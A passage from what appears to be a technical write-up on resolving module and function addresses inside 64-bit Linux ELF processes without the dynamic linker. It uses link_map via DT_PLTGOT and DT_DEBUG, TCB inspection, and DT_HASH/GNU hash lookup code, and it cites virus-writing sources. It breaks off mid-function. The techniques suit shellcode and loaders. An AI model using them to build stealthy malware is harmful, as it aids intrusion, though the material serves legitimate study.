<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>get_module_handle2<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>module<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    Elf64_Phdr      <span style='color:#808030; '>*</span>phdr<span style='color:#800080; '>;</span>
    Elf64_Dyn       <span style='color:#808030; '>*</span>got<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>void</span>            <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>=</span><span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>base<span style='color:#800080; '>;</span>
    uint64_t        <span style='color:#808030; '>*</span>ptrs<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span>map<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 1. get the base of host ELF</span>
    base <span style='color:#808030; '>=</span> get_base<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#696969; '>// 2. obtain pointer to dynamic program header</span>
    phdr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>Elf64_Phdr<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>elf_get_phdr<span style='color:#808030; '>(</span>base<span style='color:#808030; '>,</span> PT_DYNAMIC<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>phdr <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// 3. obtain global offset table</span>
      got <span style='color:#808030; '>=</span> elf_get_dyn<span style='color:#808030; '>(</span>base<span style='color:#808030; '>,</span> DT_PLTGOT<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>got <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        ptrs <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>got<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_un<span style='color:#808030; '>.</span>d_ptr<span style='color:#800080; '>;</span>
        map   <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>ptrs<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
        <span style='color:#696969; '>// 4. search through link_map for module</span>
        <span style='color:#800000; font-weight:bold; '>while</span> <span style='color:#808030; '>(</span>map <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#696969; '>// 5 if no module provided, return first in the list</span>
          <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>module <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
            addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_addr<span style='color:#800080; '>;</span>
            <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
          <span style='color:#696969; '>// otherwise, check by name</span>
          <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_strstr<span style='color:#808030; '>(</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_name<span style='color:#808030; '>,</span> module<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
            addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_addr<span style='color:#800080; '>;</span>
            <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
          <span style='color:#800080; '>}</span>
          map <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_next<span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> addr<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="dt_debug">6.3 Debug Structure (DT_DEBUG)</h3>

<p>The <code>link_map</code> is also available via the debug type or <code>DT_DEBUG</code>.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>struct</span> r_debug <span style='color:#800080; '>{</span>
    int32_t r_version<span style='color:#800080; '>;</span>          <span style='color:#696969; '>/* version, always one */</span>
    <span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span> r_map<span style='color:#800080; '>;</span>    <span style='color:#696969; '>/* list of loaded libraries */</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>r_brk<span style='color:#808030; '>)</span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>        <span style='color:#696969; '>/* marker function address */</span>
    int32_t r_state<span style='color:#800080; '>;</span>            <span style='color:#696969; '>/* zero if the state of r_map is consistent */</span>
    uintptr_t r_ldbase<span style='color:#800080; '>;</span>         <span style='color:#696969; '>/* linker base address (this is where the linker was loaded after relocation) */</span>
<span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>
</pre>

<p>The following code shows how to resolve using this type. This is essentially the same code as the <code>get_module_handle2</code> that uses <code>DT_PLTGOT</code>. In fact, it might be possible to use the same function for two separate types if we only use 64-bit pointers. This assumes that <code>r_version</code> is aligned by 8 bytes.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>get_module_handle3<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>module<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    Elf64_Phdr      <span style='color:#808030; '>*</span>phdr<span style='color:#800080; '>;</span>
    Elf64_Dyn       <span style='color:#808030; '>*</span>dbg<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>void</span>            <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>=</span><span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>base<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>struct</span> r_debug  <span style='color:#808030; '>*</span>debug<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span>map<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 1. get the base of host ELF</span>
    base <span style='color:#808030; '>=</span> get_base<span style='color:#808030; '>(</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>    
    <span style='color:#696969; '>// 2. obtain pointer to dynamic program header</span>
    phdr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>Elf64_Phdr<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>elf_get_phdr<span style='color:#808030; '>(</span>base<span style='color:#808030; '>,</span> PT_DYNAMIC<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>phdr <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// 3. obtain global offset table</span>
      dbg <span style='color:#808030; '>=</span> elf_get_dyn<span style='color:#808030; '>(</span>base<span style='color:#808030; '>,</span> DT_DEBUG<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>dbg <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        debug <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> r_debug<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>dbg<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_un<span style='color:#808030; '>.</span>d_ptr<span style='color:#800080; '>;</span>
        map   <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>debug<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>r_map<span style='color:#800080; '>;</span>
        <span style='color:#696969; '>// 4. search through link_map for module</span>
        <span style='color:#800000; font-weight:bold; '>while</span> <span style='color:#808030; '>(</span>map <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#696969; '>// 5 if no module provided, return first in the list</span>
          <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>module <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
            addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_addr<span style='color:#800080; '>;</span>
            <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
          <span style='color:#696969; '>// otherwise, check by name</span>
          <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_strstr<span style='color:#808030; '>(</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_name<span style='color:#808030; '>,</span> module<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
            addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_addr<span style='color:#800080; '>;</span>
            <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
          <span style='color:#800080; '>}</span>
          map <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_next<span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> addr<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="tcb">6.4 Thread Control Block (TCB)</h3>
 
<p>herm1t points out in <a href="http://herm1tvx.blogspot.com/2011/09/highway-to-libc.html">Highway to libc</a> that a pointer to memory belonging to glibc can be found in the TCB accessible via the <code>gs</code> register on 32-bit systems or the <code>fs</code> register on 64-bit systems. However, if you look at the value of <code>fs</code> on a 64-bit system, it appears to be empty. Accessing <code>fs</code> will still return information from the TCB, but at least on my 64-bit system, it did not contain the address of TLS as expected. <code>fs</code> is set via the <code>arch_prctl</code> system call when glibc initializes its Thread Local Storage. This system call can also read the value of <code>fs</code> or <code>gs</code>. You can of course read the value of TCB directly using assembly code. For those of you that want a more detailed explanation about the Thread Local Storage, read <a href="https://chao-tic.github.io/blog/2018/12/25/tls">A Deep dive into (implicit) Thread Local Storage</a>. The following structures can be used to interpret the memory stored in TCB.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>struct</span> dtv_pointer <span style='color:#800080; '>{</span>
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>val<span style='color:#800080; '>;</span>         <span style='color:#696969; '>/* Pointer to data, or TLS_DTV_UNALLOCATED.  */</span>
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>to_free<span style='color:#800080; '>;</span>     <span style='color:#696969; '>/* Unaligned pointer, for deallocation.  */</span>
<span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>

<span style='color:#696969; '>/* Type for the dtv.  */</span>
<span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>union</span> dtv <span style='color:#800080; '>{</span>
  <span style='color:#603000; '>size_t</span> counter<span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>struct</span> dtv_pointer pointer<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span> dtv_t<span style='color:#800080; '>;</span>

<span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>tcb<span style='color:#800080; '>;</span>            <span style='color:#696969; '>/* Pointer to the TCB.  Not necessarily the</span>
<span style='color:#696969; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;thread descriptor used by libpthread.  */</span>
  dtv_t <span style='color:#808030; '>*</span>dtv<span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>self<span style='color:#800080; '>;</span>           <span style='color:#696969; '>/* Pointer to the thread descriptor.  */</span>
  <span style='color:#800000; font-weight:bold; '>int</span> multiple_threads<span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>int</span> gscope_flag<span style='color:#800080; '>;</span>
  uintptr_t sysinfo<span style='color:#800080; '>;</span>
  uintptr_t stack_guard<span style='color:#800080; '>;</span>
  uintptr_t pointer_guard<span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>unsigned</span> <span style='color:#800000; font-weight:bold; '>long</span> <span style='color:#800000; font-weight:bold; '>int</span> vgetcpu_cache<span style='color:#808030; '>[</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
  <span style='color:#696969; '>/* Bit 0: X86_FEATURE_1_IBT.</span>
<span style='color:#696969; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;Bit 1: X86_FEATURE_1_SHSTK. */</span>
  <span style='color:#800000; font-weight:bold; '>unsigned</span> <span style='color:#800000; font-weight:bold; '>int</span> feature_1<span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>int</span> __glibc_unused1<span style='color:#800080; '>;</span>
  <span style='color:#696969; '>/* Reservation of some values for the TM ABI.  */</span>
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>__private_tm<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
  <span style='color:#696969; '>/* GCC split stack support.  */</span>
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>__private_ss<span style='color:#800080; '>;</span>
  <span style='color:#696969; '>/* The lowest address of shadow stack,  */</span>
  <span style='color:#800000; font-weight:bold; '>unsigned</span> <span style='color:#800000; font-weight:bold; '>long</span> <span style='color:#800000; font-weight:bold; '>long</span> <span style='color:#800000; font-weight:bold; '>int</span> ssp_base<span style='color:#800080; '>;</span>
  <span style='color:#696969; '>/* Must be kept even if it is no longer used by glibc since programs,</span>
<span style='color:#696969; '>&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;like AddressSanitizer, depend on the size of tcbhead_t.  */</span>
  __128bits __glibc_unused2<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span> __attribute__ <span style='color:#808030; '>(</span><span style='color:#808030; '>(</span>aligned <span style='color:#808030; '>(</span><span style='color:#008c00; '>32</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>__padding<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span> tcbhead_t<span style='color:#800080; '>;</span>
</pre>

<p><code>0x7ffff7fce440</code> represents the address of a TCB in application I was debugging. The first two values dumped give us <code>tcb</code> and <code>dtv</code>.</p>

<pre>
(gdb) x/2xg 0x7ffff7fce440
0x7ffff7fce440: 0x00007ffff7fce440      0x00007ffff7fced50</pre>

<p>Dumping the second value gives us the contents of the Dynamic Thread Vector (DTV).</p>

<pre>
(gdb) x/3xg 0x00007ffff7fced50
0x7ffff7fced50: 0x0000000000000001      0x0000000000000000
0x7ffff7fced60: 0xffffffffffffffff</pre>

<p>The counter shows one module is loaded. However, the pointer value is set to <code>TLS_DTV_UNALLOCATED</code>. While this may not have worked for me, it may be worth keeping in mind for other systems.</p>

<h3 id="static">Static Linkage</h3>

ASLR Protection for Statically Linked Executables
https://www.leviathansecurity.com/blog/aslr-protection-for-statically-linked-executables

<p>Dynamic linking is enabled by default.

<p>For statically linked executables, you can find interesting information in the DTV. First, the executable has a Thread Local Storage (TLS) program header and an address to a static Dynamic Tree Vector is storedin the FS register via arch_prctl().</p>

<pre>
(gdb) nexti                                                                                                                    e6
(gdb) x/8xg 0x6b6880
0x6b6880:       0x00000000006b6880      0x00000000006b4d90
0x6b6890:       0x00000000006b6880      0x0000000000000000
0x6b68a0:       0x0000000000000000      0x5ce9a2db0f32d700
0x6b68b0:       0x0329c345398ca46b      0x0000000000000000

(gdb) x/8xg 0x00000000006b4d90
0x6b4d90 <_dl_static_dtv+16>:   0x0000000000000000      0x0000000000000000
0x6b4da0 <_dl_static_dtv+32>:   0x00000000006b6830      0x0000000000000001
0x6b4db0 <_dl_static_dtv+48>:   0x0000000000000000      0x0000000000000000
0x6b4dc0 <_dl_static_dtv+64>:   0x0000000000000000      0x0000000000000000
(gdb) 
</pre>

<h3 id="dlsym">7. Resolving Address of Functions</h3>

<p>At this point we should have the base address of host process and the base address of libc. However, even if you only managed to retrieve the base address of libc, that would be sufficient to do everything else.</p>

<h3 id="dt_hash">7.1 ELF Hash Table (DT_HASH)</h3>

<p>Instead of repeating information already available, let me refer you to a couple of posts about this.</p>

<ol>
  <li><a href="https://web.archive.org/web/20170614221144/http://vxheaven.org/lib/vhe02.html">Hashin' the elves</a> by herm1t</li>
  <li><a href="https://flapenguin.me/2017/04/24/elf-lookup-dt-hash/">ELF: symbol lookup via DT_HASH</a> by FLAPENGUIN</li>
</ol>

<p>The following code is derived from those two posts.</p>

<pre style='color:#000000;background:#ffffff;'>uint32_t elf_hash<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> uint8_t <span style='color:#808030; '>*</span>name<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    uint32_t h <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> g<span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>while</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>name<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      h <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>h <span style='color:#808030; '>&lt;</span><span style='color:#808030; '>&lt;</span> <span style='color:#008c00; '>4</span><span style='color:#808030; '>)</span> <span style='color:#808030; '>+</span> <span style='color:#808030; '>*</span>name<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#800080; '>;</span>
      g <span style='color:#808030; '>=</span> h <span style='color:#808030; '>&amp;</span> <span style='color:#008000; '>0xf0000000</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span> <span style='color:#808030; '>(</span>g<span style='color:#808030; '>)</span>
        h <span style='color:#808030; '>^</span><span style='color:#808030; '>=</span> g <span style='color:#808030; '>></span><span style='color:#808030; '>></span> <span style='color:#008c00; '>24</span><span style='color:#800080; '>;</span>
      h <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>=</span> <span style='color:#808030; '>~</span>g<span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> h<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>

<span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>elf_lookup<span style='color:#808030; '>(</span>
  <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>name<span style='color:#808030; '>,</span> 
  uint32_t <span style='color:#808030; '>*</span>hashtab<span style='color:#808030; '>,</span> 
  Elf64_Sym <span style='color:#808030; '>*</span>sym<span style='color:#808030; '>,</span> 
  <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>str<span style='color:#808030; '>)</span> 
<span style='color:#800080; '>{</span>
    uint32_t  idx<span style='color:#800080; '>;</span>
    uint32_t  nbuckets <span style='color:#808030; '>=</span> hashtab<span style='color:#808030; '>[</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    uint32_t<span style='color:#808030; '>*</span> buckets  <span style='color:#808030; '>=</span> <span style='color:#808030; '>&amp;</span>hashtab<span style='color:#808030; '>[</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    uint32_t<span style='color:#808030; '>*</span> chains   <span style='color:#808030; '>=</span> <span style='color:#808030; '>&amp;</span>buckets<span style='color:#808030; '>[</span>nbuckets<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span>idx <span style='color:#808030; '>=</span> buckets<span style='color:#808030; '>[</span>elf_hash<span style='color:#808030; '>(</span>name<span style='color:#808030; '>)</span> <span style='color:#808030; '>%</span> nbuckets<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span> 
        idx <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span> 
        idx <span style='color:#808030; '>=</span> chains<span style='color:#808030; '>[</span>idx<span style='color:#808030; '>]</span><span style='color:#808030; '>)</span> 
    <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// does string match for this index?</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span><span style='color:#808030; '>!</span>_strcmp<span style='color:#808030; '>(</span>name<span style='color:#808030; '>,</span> sym<span style='color:#808030; '>[</span>idx<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>st_name <span style='color:#808030; '>+</span> str<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span>
        <span style='color:#696969; '>// return address of function</span>
        <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>sym<span style='color:#808030; '>[</span>idx<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>st_value<span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="dt_gnu_hash">7.2 GNU Hash Table (DT_GNU_HASH)</h3>

<p>In June 2006, support for the <code>DT_GNU_HASH</code> table was added and this apparently <a href="http://www.sourceware.org/ml/binutils/2006-06/msg00418.html">speeds up searches by 50%.</a> The hash function was posted to <a href="https://groups.google.com/d/msg/comp.lang.c/lSKWXiuNOAk/udpb7vzbH4AJ">comp.lang.c</a> all the way back in 1991 by Dan Bernstein. Deroko from ARTeam discusses it <a href="http://deroko.phearless.org/dt_gnu_hash.txt">here</a> while FLAPENGUIN discusses it <a href="https://flapenguin.me/2017/05/10/elf-lookup-dt-gnu-hash/">here</a>. The following code is derived from the post by FLAPENGUIN.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#004a43; '>#</span><span style='color:#004a43; '>define</span><span style='color:#004a43; '> ELFCLASS_BITS 64</span>

uint32_t gnu_hash<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> uint8_t <span style='color:#808030; '>*</span>name<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    uint32_t h <span style='color:#808030; '>=</span> <span style='color:#008c00; '>5381</span><span style='color:#800080; '>;</span>

    <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span><span style='color:#800080; '>;</span> <span style='color:#808030; '>*</span>name<span style='color:#800080; '>;</span> name<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      h <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>h <span style='color:#808030; '>&lt;</span><span style='color:#808030; '>&lt;</span> <span style='color:#008c00; '>5</span><span style='color:#808030; '>)</span> <span style='color:#808030; '>+</span> h <span style='color:#808030; '>+</span> <span style='color:#808030; '>*</span>name<span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> h<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>

<span style='color:#800000; font-weight:bold; '>struct</span> gnu_hash_table <span style='color:#800080; '>{</span>
    uint32_t nbuckets<span style='color:#800080; '>;</span>
    uint32_t symoffset<span style='color:#800080; '>;</span>
    uint32_t bloom_size<span style='color:#800080; '>;</span>
    uint32_t bloom_shift<span style='color:#800080; '>;</span>
    uint64_t bloom<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    uint32_t buckets<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    uint32_t chain<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>

<span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span> gnu_lookup<span style='color:#808030; '>(</span>
    <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span><span style='color:#808030; '>*</span> name<span style='color:#808030; '>,</span>          <span style='color:#696969; '>/* symbol to look up */</span>
    <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span> hash_tbl<span style='color:#808030; '>,</span>      <span style='color:#696969; '>/* hash table */</span>
    <span style='color:#800000; font-weight:bold; '>const</span> Elf64_Sym<span style='color:#808030; '>*</span> symtab<span style='color:#808030; '>,</span>   <span style='color:#696969; '>/* symbol table */</span>
    <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span><span style='color:#808030; '>*</span> strtab         <span style='color:#696969; '>/* string table */</span>
<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>struct</span> gnu_hash_table <span style='color:#808030; '>*</span>hashtab <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> gnu_hash_table<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>hash_tbl<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>const</span> uint32_t  namehash    <span style='color:#808030; '>=</span> gnu_hash<span style='color:#808030; '>(</span>name<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>

    <span style='color:#800000; font-weight:bold; '>const</span> uint32_t  nbuckets    <span style='color:#808030; '>=</span> hashtab<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>nbuckets<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>const</span> uint32_t  symoffset   <span style='color:#808030; '>=</span> hashtab<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>symoffset<span style='color:#800080; '>;</span>
